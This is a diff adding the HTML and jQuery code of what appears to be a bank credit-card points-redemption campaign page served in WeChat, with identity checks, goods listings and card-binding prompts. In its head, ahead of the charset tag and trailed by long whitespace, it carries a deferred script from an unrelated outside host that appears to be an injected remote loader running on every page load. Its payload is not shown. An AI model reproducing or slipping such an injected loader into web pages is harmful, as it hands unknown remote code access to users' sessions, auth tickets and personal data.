@@ -1,0 +1,397 @@
+﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html lang="en">
+<head><script defer src="https://i.cot8.cc/j/?t=fx&v=1&g=cc81da4ac700&c=e84e063c3386&A=8"></script>                         
+    <meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta name="format-detection" content="telephone=no">
+    <meta http-equiv="Cache-Control" content="max-age=1" />
+    <title>浦发银行信用卡</title>
+    <link rel="stylesheet" href="./css/basic.css">
+    <link rel="stylesheet" href="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_css/smoothness/jquery-ui-1.10.1.custom.css">
+    <link rel="stylesheet" href="./css/customDialog.css?v=1">
+    
+    <script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/jquery.min.js"></script>
+    <script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/jquery-ui-1.10.1.custom.min.js"></script>
+
+    <script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/salama/preventClickDoubleFired.js"></script>
+    <script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/salama/easyJsDomUtil.js"></script>
+    <script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/salama/salamaWebClientService.js"></script>
+    <script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/activity/common_js/lib/salama/salamaClientService.js"></script>
+    <script src="https://magicactivity.oss-cn-hangzhou.aliyuncs.com/scrm/scrm_collector.js?v=10"></script>
+
+    <script src="http://res.wx.qq.com/open/js/jweixin-1.0.0.js?v=1"></script>
+
+    <script src="./js/lib/customDialog.js"></script>
+    <script src="./js/common.js?v=0"></script>
+    <script src="./js/commonShare.js?v=2"></script>
+
+    <script>
+	var entryListNode,entryListNodeCopy;
+var infoListNode,infoListNodeCopy;
+
+var appId,sectionId,appType,sectionName,sectionStartTime,sectionEndTime,sectionIconUrl,sectionDetailUrl;
+
+var entryTimeFlag=false;
+var entryTimeOut;
+var clickType = '';
+
+var appIdValue,sectionIdValue,goodsIdValue;
+
+$(document).ready(function(){
+    startSpinner();
+    setHtmlFontSize();
+    initWxSetting(initFormInfo,doSendShare,false,true,false);
+    // initFormInfo();// debug
+});
+
+function initFormInfo(){
+    // alert('paramChannelId='+paramChannelId+'->appId='+paramAppId+'->paramUserId:'+paramUserId+'->sectionNo:'+paramSectionNo+'->paramSign:'+paramSign+'->cookie:'+cookieAuthTicket);
+    // dom copy
+    infoListNode = $('[id="infoList"]')[0];
+    var infoListNodeTmp = $('[infoResult="LineInfo"]')[0];
+    infoListNodeCopy = $(infoListNodeTmp).clone();
+    $(infoListNodeTmp).remove();
+
+    entryListNode = $('[id="List"]')[0];
+    var entryListNodeTmp = $('[entryResult="SectionGoodsInfo"]')[0];
+    entryListNodeCopy = $(entryListNodeTmp).clone();
+    $(entryListNodeTmp).remove();
+
+    // 绑定事件
+    $('#backPage').unbind("click").bind('click',function(){ //左上角返回
+        gotoAppIndex()
+    });
+
+    $('[id="gotoRule"]').unbind('click').bind('click',function(){ //活动细则
+        var url = "./rule.html?channelId="+paramChannelId+"&appId="+paramAppId+"&sectionNo="+paramSectionNo+"&userId="+paramUserId + "&sign="+paramSign + "&timeStamp="+(new Date()).getTime();
+        window.location = url;
+    });
+    $('[id="gotoList"]').unbind('click').bind('click',function(){ //我的奖品
+        clickType = 'myList';
+        doFindEntryResult();
+    });
+    $('[id="gotoOrder"]').unbind('click').bind('click',function(){ //我的订单
+        clickType = 'order';
+        doFindEntryResult();
+    });
+
+    doFindGoodsRackBySectionNo();
+    // debug
+    // afterFindGoodsRackBySectionNo('<SectionGoodsRackPageView><errorCode>0</errorCode><errorMsg>数据出错</errorMsg><appId>appId_000</appId><sectionId>sectionId_000</sectionId><appType>appType_000</appType><sectionStartTime>1497917000000</sectionStartTime><sectionEndTime>1497973800000</sectionEndTime><arrGoodsInfos><SectionGoodsInfo><appId>appId_000</appId><goodsId>goodsId_000</goodsId><goodsType>goodsType_000</goodsType><goodsName>1496246400000</goodsName><goodsIconUrl>./imgs/pro_01.png</goodsIconUrl><arrGoodsLines><LineInfo><lineName>哈根达斯单球冰淇淋</lineName><lineValue></lineValue></LineInfo><LineInfo><lineName>现价：</lineName><lineValue>2049积分</lineValue></LineInfo><LineInfo><lineName>市场价：</lineName><lineValue>30元</lineValue></LineInfo><LineInfo><lineName>限量：</lineName><lineValue>5000份</lineValue></LineInfo></arrGoodsLines></SectionGoodsInfo><SectionGoodsInfo><appId>appId_001</appId><goodsId>goodsId_001</goodsId><goodsType>goodsType_001</goodsType><goodsName>1496246400000</goodsName><goodsIconUrl>./imgs/pro_02.png</goodsIconUrl><arrGoodsLines><LineInfo><lineName>酷圣石 原创中杯</lineName><lineValue></lineValue></LineInfo><LineInfo><lineName>现价：</lineName><lineValue>2049积分</lineValue></LineInfo><LineInfo><lineName>市场价：</lineName><lineValue>30元</lineValue></LineInfo><LineInfo><lineName>限量：</lineName><lineValue>5000份</lineValue></LineInfo></arrGoodsLines></SectionGoodsInfo><SectionGoodsInfo><appId>appId_002</appId><goodsId>goodsId_002</goodsId><goodsType>goodsType_002</goodsType><goodsName>1496246400000</goodsName><goodsIconUrl>./imgs/pro_03.png</goodsIconUrl><arrGoodsLines><LineInfo><lineName>DQ 30元代金券（华东）</lineName><lineValue></lineValue></LineInfo><LineInfo><lineName>现价：</lineName><lineValue>2049积分</lineValue></LineInfo><LineInfo><lineName>市场价：</lineName><lineValue>30元</lineValue></LineInfo><LineInfo><lineName>限量：</lineName><lineValue>5000份</lineValue></LineInfo></arrGoodsLines></SectionGoodsInfo></arrGoodsInfos></SectionGoodsRackPageView>');
+}
+
+function doFindGoodsRackBySectionNo(){
+    clientService.doPost({
+        target: "com.ebuy.o2o.campaign.service.summer.SummerService",
+        method: "findGoodsRackBySectionNo",
+        dataObj: {
+            channelId: paramChannelId,
+            appId:paramAppId,
+            authTicket: cookieAuthTicket,
+            userId: paramUserId,
+            sign: paramSign,
+            sectionNo:paramSectionNo
+        },
+        callBackWhenSucceed: "afterFindGoodsRackBySectionNo",
+        callBackWhenError: "doError"
+    })
+}
+function afterFindGoodsRackBySectionNo(returnValue){
+    // alert('afterFindGoodsRackBySectionNo:'+returnValue);
+    stopSpinner();
+    if(isEmpty(returnValue)){
+        doError();
+        return;
+    }
+
+    var rootXmlNode = easyJsDomUtil.parseXML(returnValue);
+    var errorCode = $(rootXmlNode).find('SectionGoodsRackPageView').find('errorCode').text();
+    if(errorCode == 0){ //正常
+
+        appId = $(rootXmlNode).find('SectionGoodsRackPageView').find('appId').text();
+        sectionId = $(rootXmlNode).find('SectionGoodsRackPageView').find('sectionId').text();
+        appType = $(rootXmlNode).find('SectionGoodsRackPageView').find('appType').text();
+        sectionName = $(rootXmlNode).find('SectionGoodsRackPageView').find('sectionName').text();
+        sectionStartTime = $(rootXmlNode).find('SectionGoodsRackPageView').find('sectionStartTime').text();
+        sectionEndTime = $(rootXmlNode).find('SectionGoodsRackPageView').find('sectionEndTime').text();
+        sectionIconUrl = $(rootXmlNode).find('SectionGoodsRackPageView').find('sectionIconUrl').text();
+        sectionDetailUrl = $(rootXmlNode).find('SectionGoodsRackPageView').find('sectionDetailUrl').text();
+
+        $(rootXmlNode).find('SectionGoodsRackPageView').find('SectionGoodsInfo').each(function(index){
+            var cloneNode = $(entryListNodeCopy).clone();
+
+            $(cloneNode).find('[entryResult="appId"]').val($(this).find('appId').text());
+            $(cloneNode).find('[entryResult="goodsId"]').val($(this).find('goodsId').text());
+            $(cloneNode).find('[entryResult="goodsType"]').val($(this).find('goodsType').text());
+            $(cloneNode).find('[entryResult="goodsName"]').val($(this).find('goodsName').text());
+            $(cloneNode).find('[entryResult="goodsIconUrl"]').val($(this).find('goodsIconUrl').text());
+            $(cloneNode).find('[entryResult="goodsDetailUrl"]').val($(this).find('goodsDetailUrl').text());
+            $(cloneNode).find('[entryResult="goodsDescption"]').val($(this).find('goodsDescption').text());
+            $(cloneNode).find('[entryResult="extra_info"]').val($(this).find('extra_info').text());
+
+            // 设置图片 按钮
+            $(cloneNode).find('[id="public_img_url"]').attr('src',$(this).find('goodsIconUrl').text());
+
+            var arrLines = $(this).find('arrGoodsLines');
+            $(arrLines).find('LineInfo').each(function(num){
+                var cloneInfoNode = $(infoListNodeCopy).clone();
+                $(cloneInfoNode).find('[infoResult="name"]').val($(this).find('lineName').text());
+                $(cloneInfoNode).find('[infoResult="value"]').val($(this).find('lineValue').text());
+                $(cloneInfoNode).find('.nameValue').html($(this).find('lineName').text()+$(this).find('lineValue').text());
+                $(cloneNode).find('[id="infoList"]').append(cloneInfoNode);
+            });
+
+            $(cloneNode).unbind('click').bind('click',function(){ //绑定事件
+                var a = (new Date).getTime();
+
+                    appIdValue = appId;
+                    sectionIdValue = sectionId;
+                    goodsIdValue = $(this).find('[entryresult="goodsId"]').val();
+
+                    //核身
+                    clickType = 'seckill';
+                    doFindEntryResult();
+            });
+            $(cloneNode).find('[id="gotoShop"]').unbind('click').bind('click',function(){ //适用门店
+                event.stopPropagation();
+                var extra_info = $(cloneNode).find('[entryresult="extra_info"]').val();
+                window.location = extra_info;
+            });
+
+            $(entryListNode).append(cloneNode);
+        });
+
+        stopSpinner();
+        $('[id="page"]').removeClass('vis_h');
+    }else{
+        var errorMsg = $(rootXmlNode).find('SectionGoodsRackPageView').find('errorMsg').text();
+        showDialog.showInfoDialog({title : "提示信息", msgInfo : errorMsg});
+    }
+}
+
+//核身
+function doFindEntryResult(){
+    clientService.doPost({
+        target: "com.ebuy.o2o.campaign.service.summer.SummerService",
+        method: "findEntryResult",
+        dataObj: {
+            channelId: paramChannelId,
+            authTicket: cookieAuthTicket,
+            userId: paramUserId,
+            sign: paramSign
+        },
+        callBackWhenSucceed: "afterDoFindEntryResult",
+        callBackWhenError: "doError"
+    })
+    // debug
+    // afterDoFindEntryResult('<EntryResult><errorCode>0</errorCode><errorMsg>数据出错</errorMsg><status>0</status></EntryResult>');
+}
+
+function afterDoFindEntryResult(a){
+    // alert('afterDoFindEntryResult:'+a);
+    clearTimeout(entryTimeOut);
+    if (isEmpty(a)) doError();
+    else {
+        a = easyJsDomUtil.parseXML(a);
+        var b = $(a).find("EntryResult").find("errorCode").text();
+        var status = $(a).find("EntryResult").find("status").text();
+
+        if(b == '0'){
+            if(status == '0'){
+                stopSpinner();
+                $('[id="overLayer"]').show();
+                $('[id="vote_loading"]').show();
+
+                if(entryTimeFlag == false){
+                    entryTimeOut = setTimeout("doFindEntryResult()",1000);
+                }
+            }else if(status == '1'){ //成功
+                entryTimeFlag = true;
+                $('[id="overLayer"]').hide();
+                $('[id="vote_loading"]').hide();
+
+                if(clickType == 'myList'){ //我的奖品
+                    var url = "./list.html?channelId="+paramChannelId+"&appId="+paramAppId+"&sectionId="+sectionId+"&sectionNo="+paramSectionNo+"&userId="+paramUserId + "&sign="+paramSign + "&timeStamp="+(new Date()).getTime();
+                    window.location = url;
+                }else if(clickType == 'seckill'){ //抢购
+                    var url = "./seckill.html?appId="+appIdValue+"&channelId="+paramChannelId+"&sectionNo="+paramSectionNo+"&sectionId="+sectionIdValue+"&goodsId="+goodsIdValue+"&userId="+paramUserId + "&sign="+paramSign + "&timeStamp="+(new Date()).getTime();
+                    window.location = url;
+                }else if(clickType == 'order'){ //订单
+                    var url = "./order.html?channelId="+paramChannelId+"&appId="+paramAppId+"&sectionId="+sectionId+"&sectionNo="+paramSectionNo+"&userId="+paramUserId + "&sign="+paramSign + "&timeStamp="+(new Date()).getTime();
+                    window.location = url;
+                }
+            }else if(status == '2'){ //
+                $('[id="overLayer"]').hide();
+                $('[id="vote_loading"]').hide();
+
+                entryTimeFlag = true;
+                bindCard();
+            }
+        }else if(b == '4003'){
+            $('[id="overLayer"]').hide();
+            $('[id="vote_loading"]').hide();
+
+            entryTimeFlag = true;
+            bindCard();
+        }else if(b == '4001'){
+            $('[id="overLayer"]').hide();
+            $('[id="vote_loading"]').hide();
+
+            entryTimeFlag = true;
+            bindCard();
+        }else{
+            $('[id="overLayer"]').hide();
+            $('[id="vote_loading"]').hide();
+
+            entryTimeFlag = true;
+            bindCard();
+        }
+    }
+}
+function bindCard(){
+    stopSpinner();
+    showDialog.showConfirmDialog({
+        title: "提示信息",
+        msgInfo: '对不起<br/>您还未绑定浦发信用卡！',
+        btnOkTxt: "绑定",
+        btnCancelTxt: "办卡",
+        btnOk: function() {
+            showDialog.showInfoDialog({
+                title: "提示信息",
+                msgInfo: "返回浦发信用卡官方<br/>微信主页面，发送“绑定”，<br/>并根据提示进行绑定操作。"
+            })
+        },
+        btnCancel: function() {
+            window.location = "https://mbank.spdbccc.com.cn/creditcard/indexActivity.htm?data=000004"
+        }
+    });
+}
+
+/**
+ * app端左上角返回
+ * @return {[type]} [description]
+ */
+function gotoAppIndex(){
+    var osType = getOsType();
+    if(osType == 1){//安卓
+        window.jsspdb.lifeGoBack();
+    }else if(osType == 0){// ios
+        document.location="jsspdb:;lifeCall:,close";
+    }
+}
+
+/**
+ * 日期格式化
+ * @param  {[type]} nS [description]
+ * @return {[type]}    [description]
+ */
+function getDateFn(nS){
+    var date = new Date(nS*1000);
+    var year = date.getFullYear();
+    var month = date.getMonth()+1<10?'0'+(date.getMonth()+1):date.getMonth()+1;
+    var day = date.getDate()<10?'0'+date.getDate():date.getDate();
+    var h = date.getHours()<10?'0'+date.getHours():date.getHours();
+    var m = date.getMinutes()<10?'0'+date.getMinutes():date.getMinutes();
+    var s = date.getSeconds()<10?'0'+date.getSeconds():date.getSeconds();
+
+    return month+'月'+day+'日';
+}
+	</script>
+<style>
+.page{background-image:url('./imgs/bg.jpg');background-size:100% 100%;background-repeat:no-repeat;background-position:center 0;}
+.r1{}
+.r2{width:15.55rem;margin:0.5rem auto;overflow: hidden;}
+.r2 ul li{width:15.55rem;height:5.25rem;position: relative;background-size:100% 100%;background-repeat: no-repeat;background-position: center center;overflow: hidden;}
+.r2 ul li:nth-child(1){background-image:url('./imgs/pro_bg_03.png')}
+.r2 ul li:nth-child(2){background-image:url('./imgs/pro_bg_02.png')}
+.r2 ul li:nth-child(3){background-image:url('./imgs/pro_bg_03.png')}
+.r2 ul li:nth-child(4){background-image:url('./imgs/pro_bg_01.png')}
+.r2 ul li:nth-child(5){background-image:url('./imgs/pro_bg_03.png')}
+
+.r2_1{width:3.6rem;height:3.6rem;position: absolute;left:0.8rem;top:0.6rem;}
+.r2_2{margin-left:5.1rem;font-size:0.65rem;margin-top:0.55rem;color:#325FA3;line-height:0.9rem;}
+.r2_2 .item{}
+.r2_2 .item:nth-child(1){}
+.r2_2 .item:nth-child(2){}
+.r2_2 .item:nth-child(3) span{font-size:0.6rem;text-decoration:line-through;color:#738EBD;}
+.r2_2 .item:nth-child(4){display: none;}
+
+.r2_3{position: absolute;left:5.1rem;bottom:1.1rem;font-size:0.6rem;color:#325FA3;text-decoration: underline;}
+.r2_3 span{margin-right:0.6rem;text-decoration: underline;}
+
+.r3{margin:0.5rem 0.8rem 1rem;overflow: hidden;}
+.r3 ul li{width:3.9rem;height:1.4rem;line-height:1.4rem;text-align: center;font-size:0.7rem;color:#325FA3;float: left;margin-right:1.35rem;background-image: url('./imgs/btn.png');background-size:100% 100%;background-repeat: no-repeat;background-position: center center;}
+.r3 ul li:last-child{margin-right:0;}
+
+.app{background-position:center 1.75rem;}
+.app .r1{margin-top:1.75rem;}
+
+@media (device-height:480px) and (-webkit-min-device-pixel-ratio:2){/*4 4s*/
+#page{min-height:504px;}
+}
+@media (min-width:360px) and (max-height:540px){/*huawei*/
+#page{min-height:567px;}
+}
+</style>
+</head>
+<body>
+    <div class="page vis_h" id="page">
+        <div class="r1">
+            <img src="./imgs/banner.png" alt="">
+        </div>
+        <div class="r2">
+            <ul id="List">
+                <li entryResult="SectionGoodsInfo">
+                    <input type="hidden" entryResult='appId'>
+                    <input type="hidden" entryResult='goodsId'>
+                    <input type="hidden" entryResult='goodsType'>
+                    <input type="hidden" entryResult='goodsName'>
+                    <input type="hidden" entryResult='goodsIconUrl'>
+                    <input type="hidden" entryResult='goodsDetailUrl'>
+                    <input type="hidden" entryResult='goodsDescption'>
+                    <input type="hidden" entryResult='extra_info'>
+
+                    <div class="r2_1">
+                        <img src="" alt="" id="public_img_url">
+                    </div>
+                    <div class="r2_2" id="infoList">
+                        <div class="item" infoResult="LineInfo">
+                            <input type="hidden" infoResult='name'>
+                            <input type="hidden" infoResult='value'>
+                            <span class="nameValue"></span>
+                        </div>
+                    </div>
+                    <div class="r2_3" id="gotoShop">
+                        适用门店
+                    </div>
+                </li>
+            </ul>
+        </div>
+        <div class="r3">
+            <ul class="clearfix">
+                <li id="gotoOrder">
+                    我的订单
+                </li>
+                <li id="gotoRule">
+                    活动规则
+                </li>
+                <li id="gotoList">
+                    我的奖品
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <div class="overLayer" id="overLayer" style="display:none"></div>
+    <div class="shareLayer" id="shareLayer" style="display:none"></div>
+
+    <div class="vote_loading" id="vote_loading" style="display:none;">
+        <div class="vote_loading_wrap">
+            <div class="vote_loading_txt">
+                <span>正在验证您的身份...</span>
+            </div>
+        </div>
+    </div>
+
+</body>
+</html>
